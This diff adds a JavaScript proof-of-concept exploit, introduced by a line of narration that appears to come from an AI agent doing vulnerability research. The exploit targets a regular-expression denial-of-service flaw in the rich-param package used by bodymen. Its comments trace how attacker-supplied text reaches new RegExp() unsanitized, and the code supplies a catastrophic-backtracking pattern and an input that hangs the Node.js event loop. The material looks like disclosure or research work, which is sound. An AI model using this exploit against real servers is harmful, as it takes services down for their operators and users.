@@ -1,0 +1,41 @@
+Good — confirms exponential growth (25 chars ≈ 1s, 31 chars ≈ times out at 15s+), proving catastrophic backtracking. Final exploit:
+
+```javascript
+// Vulnerability: ReDoS (uncontrolled regular expression) in rich-param
+// (a dependency of bodymen, an Express/MongoDB body-parser middleware).
+//
+// rich-param's Param#value() builds a RegExp directly from an
+// attacker-supplied string whenever a schema field is declared with
+// `type: RegExp`:
+//
+//   if (options.type.name === 'RegExp') {
+//     _value = new RegExp(_value, 'i');   // <-- no sanitization
+//   }
+//
+// bodymen exposes this to network input: any request field mapped to a
+// RegExp-typed schema param (e.g. a "search" query field for building a
+// MongoDB $regex filter) has its raw string value passed straight into
+// `new RegExp()`. A remote attacker can submit a pattern that is exponential
+// under backtracking (classic ReDoS), causing catastrophic performance when
+// matched, freezing the Node.js event loop / whole server (single-threaded).
+
+const Param = require("rich-param").default;
+
+// Simulates bodymen turning `req.body.search` into a schema Param of type RegExp.
+const evilPattern = "(a+)+$"; // attacker-controlled, e.g. from req.body.search
+
+const param = new Param("search", null, { type: RegExp });
+param.value(evilPattern); // <-- attacker string flows straight into `new RegExp()`
+const regex = param.value();
+
+console.log("Attacker-controlled RegExp built by rich-param:", regex);
+
+// A string the server would legitimately need to test against this filter
+// (e.g. a stored document field). Just 31 chars is enough to hang the process.
+const victimString = "a".repeat(31) + "!";
+
+console.log("Triggering catastrophic backtracking, this will hang...");
+const start = Date.now();
+regex.test(victimString); // never returns in practical time -> Denial of Service
+console.log("Finished in", Date.now() - start, "ms (should never print quickly)");
+```
